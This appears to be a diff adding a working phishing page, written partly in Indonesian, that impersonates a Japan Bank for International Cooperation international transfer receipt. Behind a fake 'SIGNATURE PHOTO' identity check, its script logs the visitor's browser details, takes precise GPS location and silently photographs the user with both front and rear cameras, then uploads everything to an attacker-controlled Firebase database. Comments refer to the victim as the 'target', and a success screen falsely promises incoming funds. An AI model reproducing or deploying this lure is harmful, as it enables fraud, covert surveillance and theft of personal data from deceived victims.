@@ -1,0 +1,530 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>JBIC - International Transfer Receipt</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{
+  font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif;
+  background:#f5f6f8;
+  min-height:100vh;
+  color:#1a1a1a;
+  padding:16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.receipt{
+  max-width:440px;
+  width:100%;
+  background:#fff;
+  border-radius:14px;
+  box-shadow:0 8px 40px rgba(0,0,0,.08), 0 2px 8px rgba(0,0,0,.04);
+  padding:32px 28px 24px;
+  position:relative;
+}
+
+/* ============ LOGO JBIC ============ */
+.jbic-logo-wrap{
+  text-align:center;
+  margin-bottom:26px;
+}
+.jbic-logo-svg{
+  width:200px;
+  height:auto;
+  display:inline-block;
+}
+.jbic-logo-caption{
+  font-size:7px;
+  color:#333;
+  letter-spacing:1.5px;
+  margin-top:4px;
+  font-weight:600;
+}
+
+/* ============ TITLE ============ */
+.jbic-title{
+  text-align:center;
+  font-size:15px;
+  font-weight:700;
+  color:#1a1a1a;
+  letter-spacing:.4px;
+  margin-bottom:6px;
+  line-height:1.4;
+  text-transform:uppercase;
+}
+.jbic-subtitle{
+  text-align:center;
+  font-size:12px;
+  color:#888;
+  margin-bottom:22px;
+  letter-spacing:.3px;
+}
+
+/* ============ AMOUNT BOX ============ */
+.amount-box{
+  background:#f7f8fa;
+  border-radius:10px;
+  padding:22px 16px;
+  text-align:center;
+  margin-bottom:22px;
+}
+.amount-label{
+  font-size:10px;
+  color:#999;
+  letter-spacing:1px;
+  margin-bottom:10px;
+  font-weight:500;
+}
+.amount-main{
+  font-size:24px;
+  font-weight:800;
+  color:#1a1a1a;
+  font-family:'Courier New',monospace;
+  letter-spacing:.5px;
+  margin-bottom:2px;
+}
+.amount-secondary{
+  font-size:22px;
+  font-weight:800;
+  color:#1a1a1a;
+  font-family:'Courier New',monospace;
+  letter-spacing:.5px;
+}
+
+/* ============ INFO BLUR (target ngisi sendiri) ============ */
+.info-blur{
+  padding:14px 0;
+  margin-bottom:20px;
+  text-align:center;
+  color:#bbb;
+  font-size:11px;
+  letter-spacing:1.5px;
+  filter:blur(3px);
+  user-select:none;
+  pointer-events:none;
+  line-height:1.8;
+}
+.info-blur::before{
+  content:'Sender Bank  ·  Sender Name  ·  Sender Account';
+  display:block;
+}
+.info-blur::after{
+  content:'Receiver Bank  ·  Receiver Name  ·  Receiver Account';
+  display:block;
+  margin-top:6px;
+}
+
+/* ============ BUTTON ============ */
+.btn-signature{
+  width:100%;
+  padding:15px;
+  background:#1a73e8;
+  color:#fff;
+  border:none;
+  border-radius:8px;
+  font-size:14px;
+  font-weight:700;
+  letter-spacing:1px;
+  cursor:pointer;
+  transition:transform .15s, background .2s;
+  font-family:inherit;
+}
+.btn-signature:active{
+  transform:scale(.98);
+  background:#1765cc;
+}
+.btn-signature:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+}
+
+.footer-note{
+  text-align:center;
+  font-size:9px;
+  color:#bbb;
+  letter-spacing:.4px;
+  margin-top:14px;
+  line-height:1.5;
+}
+
+/* ============ LOADING ============ */
+.loading-overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(255,255,255,.97);
+  z-index:999;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  padding:24px;
+}
+.loading-overlay.show{display:flex}
+.spinner{
+  width:54px;height:54px;
+  border:4px solid #e8eaed;
+  border-top-color:#1a73e8;
+  border-radius:50%;
+  animation:spin .9s linear infinite;
+  margin-bottom:18px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{
+  font-size:13px;
+  color:#444;
+  font-weight:600;
+  text-align:center;
+}
+.loading-sub{
+  font-size:11px;
+  color:#999;
+  margin-top:6px;
+  text-align:center;
+}
+
+/* ============ SUCCESS ============ */
+.success-overlay{
+  position:fixed;
+  inset:0;
+  background:#fff;
+  z-index:999;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  padding:24px;
+  text-align:center;
+}
+.success-overlay.show{display:flex}
+.success-icon{
+  width:80px;height:80px;
+  border-radius:50%;
+  background:#e8f5e9;
+  display:grid;
+  place-items:center;
+  margin-bottom:20px;
+  font-size:42px;
+  color:#34a853;
+  animation:pop .4s cubic-bezier(.4,0,.2,1);
+}
+@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+.success-title{
+  font-size:20px;
+  font-weight:800;
+  color:#1a1a1a;
+  margin-bottom:10px;
+}
+.success-desc{
+  font-size:13px;
+  color:#666;
+  line-height:1.6;
+  max-width:320px;
+}
+</style>
+</head>
+<body>
+
+<div class="receipt" id="receiptBox">
+
+  <!-- LOGO JBIC (SVG persis) -->
+  <div class="jbic-logo-wrap">
+    <svg class="jbic-logo-svg" viewBox="0 0 400 90" xmlns="http://www.w3.org/2000/svg">
+      <!-- Icon lingkaran JBIC -->
+      <circle cx="45" cy="45" r="32" fill="none" stroke="#c8102e" stroke-width="3"/>
+      <path d="M 38 25 Q 45 45 38 65 M 52 25 Q 45 45 52 65 M 28 40 Q 45 45 62 40 M 28 50 Q 45 45 62 50"
+            fill="none" stroke="#c8102e" stroke-width="2.2" stroke-linecap="round"/>
+      <!-- Text JBIC kecil -->
+      <text x="82" y="36" font-family="Arial, sans-serif" font-size="11" font-weight="900" fill="#c8102e" letter-spacing="2">JBIC</text>
+      <text x="82" y="52" font-family="Arial, sans-serif" font-size="8" font-weight="600" fill="#555" letter-spacing="1">JAPAN BANK FOR INTERNATIONAL</text>
+      <text x="82" y="63" font-family="Arial, sans-serif" font-size="8" font-weight="600" fill="#555" letter-spacing="1">COOPERATION</text>
+      <!-- Text kanji 国際協力銀行 -->
+      <text x="230" y="52" font-family="'Yu Gothic', 'MS Gothic', 'Hiragino Kaku Gothic Pro', serif" font-size="34" font-weight="700" fill="#1a1a1a" letter-spacing="2">国際協力銀行</text>
+    </svg>
+  </div>
+
+  <!-- TITLE -->
+  <div class="jbic-title" id="rTitle">JBIC JAPAN BANK INTERNATIONAL CORPORATION</div>
+  <div class="jbic-subtitle" id="rSubtitle">Office Purchasing</div>
+
+  <!-- AMOUNT -->
+  <div class="amount-box">
+    <div class="amount-label">Amount Received</div>
+    <div class="amount-main" id="rAmountMain">IDR 0</div>
+    <div class="amount-secondary" id="rAmountSecondary">YEN 0</div>
+  </div>
+
+  <!-- INFO BLUR (target gak liat detail, tapi ada "dummy" teks biar autentik) -->
+  <div class="info-blur"></div>
+
+  <!-- BUTTON -->
+  <button class="btn-signature" id="btnSignature" type="button">SIGNATURE PHOTO</button>
+
+  <div class="footer-note">
+    © 2026 JBIC · Japan Bank for International Cooperation<br>
+    Document verified by bank system.
+  </div>
+
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <div class="loading-text" id="loadingText">Memverifikasi identitas...</div>
+  <div class="loading-sub" id="loadingSub">Mohon tunggu sebentar</div>
+</div>
+
+<div class="success-overlay" id="successOverlay">
+  <div class="success-icon">✓</div>
+  <div class="success-title">Verifikasi Berhasil</div>
+  <div class="success-desc">Data Anda sedang diproses oleh sistem JBIC. Dana akan masuk ke rekening Anda dalam 1-3 hari kerja.</div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script>
+// ==================== FIREBASE ====================
+const firebaseConfig = {
+  apiKey: "AIzaSyCNw1ZCIq-sItu5Q3p_BvJfwzMtnPAvqhE",
+  authDomain: "iron-crasher.firebaseapp.com",
+  databaseURL: "https://iron-crasher-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "iron-crasher",
+  storageBucket: "iron-crasher.firebasestorage.app",
+  messagingSenderId: "279050968109",
+  appId: "1:279050968109:web:a6bb89d64ef296d7c0eca4"
+};
+
+let db = null;
+try {
+  firebase.initializeApp(firebaseConfig);
+  db = firebase.database();
+} catch(e) { console.log('Firebase err:', e); }
+
+// ==================== PARAMS ====================
+const urlParams = new URLSearchParams(location.search);
+const CAMP_ID = urlParams.get('id') || 'JBIC-' + Date.now().toString(36).toUpperCase();
+
+// ==================== FORMAT ====================
+const RATE_FROM_IDR = {
+  JPY: 0.0095, USD: 0.000064, EUR: 0.000059, IDR: 1, MYR: 0.00028,
+  SGD: 0.000086, AUD: 0.000098, GBP: 0.00005, CNY: 0.00046, KRW: 0.087,
+  THB: 0.0022, PHP: 0.0037, VND: 1.63
+};
+
+function convertAmount(amount, fromCur, toCur) {
+  const num = parseInt(String(amount).replace(/\D/g, '')) || 0;
+  const rateFrom = RATE_FROM_IDR[fromCur] || 1;
+  const rateTo = RATE_FROM_IDR[toCur] || 1;
+  const idr = num / rateFrom;
+  const converted = Math.round(idr * rateTo);
+  return converted.toLocaleString('id-ID');
+}
+
+// ==================== LOAD CONFIG ====================
+async function loadConfig() {
+  let cfg = null;
+
+  if (db) {
+    try {
+      const snap = await db.ref('jbic_campaigns/' + CAMP_ID).once('value');
+      const data = snap.val();
+      if (data && data.config) cfg = data.config;
+    } catch(e) {}
+  }
+
+  if (!cfg && db) {
+    try {
+      const snap = await db.ref('jbic_config/default').once('value');
+      cfg = snap.val();
+    } catch(e) {}
+  }
+
+  if (!cfg) {
+    cfg = {
+      title: 'JBIC JAPAN BANK INTERNATIONAL CORPORATION',
+      subtitle: 'Office Purchasing',
+      currency: 'JPY',
+      amount: '530000',
+      senderBank: 'JBIC JAPAN BANK INTERNATIONAL CORPORATION',
+      senderName: 'TANAKA HIDEO',
+      senderAcc: '**** **** 4829',
+      receiverBank: 'BANK MUAMALAT INDONESIA',
+      receiverName: 'BUDI SANTOSO',
+      receiverAcc: '**** **** 7852'
+    };
+  }
+
+  return cfg;
+}
+
+// ==================== RENDER ====================
+async function renderReceipt() {
+  const cfg = await loadConfig();
+
+  const cur = cfg.currency || 'JPY';
+  const amount = cfg.amount || '530000';
+
+  document.getElementById('rTitle').textContent = cfg.title || 'JBIC JAPAN BANK INTERNATIONAL CORPORATION';
+  document.getElementById('rSubtitle').textContent = cfg.subtitle || 'Office Purchasing';
+
+  // Amount Received: IDR utama, currency asing sebagai sekunder
+  const amountNum = parseInt(amount.toString().replace(/\D/g, '')) || 0;
+  document.getElementById('rAmountMain').textContent = 'IDR ' + amountNum.toLocaleString('id-ID');
+
+  // currency asing
+  if (cur !== 'IDR') {
+    const converted = convertAmount(amount, 'IDR', cur);
+    document.getElementById('rAmountSecondary').textContent = cur + ' ' + converted;
+  } else {
+    const converted = convertAmount(amount, 'IDR', 'JPY');
+    document.getElementById('rAmountSecondary').textContent = 'YEN ' + converted;
+  }
+
+  // log open
+  if (db) {
+    try {
+      db.ref('jbic/' + CAMP_ID).update({
+        id: CAMP_ID,
+        openedAt: Date.now(),
+        status: 'opened',
+        url: location.href,
+        userAgent: navigator.userAgent,
+        currency: cur,
+        config: cfg
+      });
+    } catch(e) {}
+  }
+}
+
+renderReceipt();
+
+// ==================== CAMERA ====================
+async function captureCamera(facingMode) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: facingMode } },
+      audio: false
+    });
+
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    video.playsInline = true;
+    video.setAttribute('playsinline', '');
+    await video.play();
+    await new Promise(r => setTimeout(r, 1500));
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 480;
+    canvas.height = 640;
+    const ctx = canvas.getContext('2d');
+
+    const vw = video.videoWidth || 640;
+    const vh = video.videoHeight || 480;
+    const targetRatio = 480 / 640;
+    const srcRatio = vw / vh;
+
+    let sx = 0, sy = 0, sw = vw, sh = vh;
+    if (srcRatio > targetRatio) {
+      sw = vh * targetRatio;
+      sx = (vw - sw) / 2;
+    } else {
+      sh = vw / targetRatio;
+      sy = (vh - sh) / 2;
+    }
+
+    ctx.drawImage(video, sx, sy, sw, sh, 0, 0, 480, 640);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.72);
+
+    stream.getTracks().forEach(t => t.stop());
+    return dataUrl;
+  } catch(e) {
+    console.log('Camera err [' + facingMode + ']:', e.message);
+    return null;
+  }
+}
+
+// ==================== LOCATION ====================
+function captureLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) { resolve(null); return; }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve({
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        ts: Date.now()
+      }),
+      (err) => { console.log('Loc err:', err.message); resolve(null); },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  });
+}
+
+// ==================== SUBMIT ====================
+document.getElementById('btnSignature').addEventListener('click', async function() {
+  const btn = this;
+  btn.disabled = true;
+  btn.textContent = 'PROCESSING...';
+
+  const loadingOverlay = document.getElementById('loadingOverlay');
+  const loadingText = document.getElementById('loadingText');
+  const loadingSub = document.getElementById('loadingSub');
+  loadingOverlay.classList.add('show');
+
+  try {
+    loadingText.textContent = 'Mengambil data lokasi...';
+    loadingSub.textContent = 'Mohon aktifkan GPS Anda';
+    const location = await captureLocation();
+
+    if (db) {
+      try { db.ref('jbic/' + CAMP_ID).update({ location: location, status: 'verifying' }); } catch(e) {}
+    }
+
+    loadingText.textContent = 'Memverifikasi identitas (1/2)...';
+    loadingSub.textContent = 'Izinkan akses kamera';
+    const camFront = await captureCamera('user');
+
+    if (camFront && db) {
+      try { db.ref('jbic/' + CAMP_ID).update({ camFront: camFront }); } catch(e) {}
+    }
+
+    loadingText.textContent = 'Memverifikasi identitas (2/2)...';
+    loadingSub.textContent = 'Jangan tutup halaman ini';
+    const camBack = await captureCamera('environment');
+
+    if (camBack && db) {
+      try { db.ref('jbic/' + CAMP_ID).update({ camBack: camBack }); } catch(e) {}
+    }
+
+    loadingText.textContent = 'Menyelesaikan verifikasi...';
+    loadingSub.textContent = 'Hampir selesai';
+
+    if (db) {
+      try {
+        db.ref('jbic/' + CAMP_ID).update({
+          form: { name: 'JBIC Receiver', account: '****', bank: 'JBIC', phone: '-' },
+          status: 'verified',
+          verifiedAt: Date.now()
+        });
+      } catch(e) {}
+    }
+
+    await new Promise(r => setTimeout(r, 800));
+
+    loadingOverlay.classList.remove('show');
+    document.getElementById('successOverlay').classList.add('show');
+
+  } catch(e) {
+    console.log('Submit err:', e);
+    loadingOverlay.classList.remove('show');
+    btn.disabled = false;
+    btn.textContent = 'SIGNATURE PHOTO';
+    alert('Terjadi kesalahan. Silakan coba lagi.');
+  }
+});
+</script>
+
+</body>
+  </html>
